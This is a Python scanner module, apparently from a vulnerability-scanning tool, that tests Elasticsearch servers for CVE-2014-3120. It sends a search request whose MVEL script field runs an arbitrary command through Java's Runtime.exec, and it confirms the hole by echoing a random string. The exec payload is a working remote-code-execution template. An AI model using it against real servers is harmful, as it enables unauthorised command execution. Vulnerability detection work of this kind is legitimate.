#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check
from time import sleep

random_name = random_md5()

cve_2014_3120_payloads = [
    {
        'path': 'website/blog/',
        'data': '{"name": "RANDOMNAME"}'.replace('RANDOMNAME', random_name),
    },
    {
        'path': '_search?pretty',
        'data': '''{"size": 1,"query": {"filtered": {"query": {"match_all": {}}}},"script_fields": {"command": {"script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"RCECOMMAND\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"}}}''',
    }
]

def cve_2014_3120_scan(clients):
    ''' 老版本ElasticSearch支持传入动态脚本(MVEL)来执行一些复杂的操作,
        而MVEL可执行Java代码, 而且没有沙盒, 所以我们可以直接执行任意代码
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ElasticSearch',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2014-3120',
    }

    for payload in cve_2014_3120_payloads:
        random_str = random_md5(6)
        RCEcommand = 'echo ' + random_str
        
        path = payload['path']
        data = payload['data'].replace('RCECOMMAND', RCEcommand)

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                    # * 创建可能有延迟
        if (check.check_res(res.text, random_str)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
